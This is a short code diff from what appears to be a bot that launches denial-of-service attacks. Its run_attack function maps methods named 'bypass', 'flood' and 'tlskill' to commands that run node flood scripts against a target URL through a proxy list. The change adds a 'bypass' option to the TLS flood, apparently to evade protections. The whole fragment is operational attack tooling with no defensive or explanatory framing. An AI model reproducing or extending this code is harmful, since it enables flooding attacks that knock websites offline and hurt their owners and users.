@@ -67,7 +67,7 @@ async def run_attack(url, attack_time, update, method, context):
     commands = {
         'bypass': f"node {heap_size} flood.js {url} {attack_time} 10 10 live.txt bypass",
         'flood': f"node {heap_size} flood.js {url} {attack_time} 32 16 live.txt flood",
-        'tlskill': f"node {heap_size} tlskill.js {url} {attack_time} 64 16 live.txt" 
+        'tlskill': f"node {heap_size} tlskill.js {url} {attack_time} 64 16 live.txt bypass" 
     }
 
     command = commands.get(method)
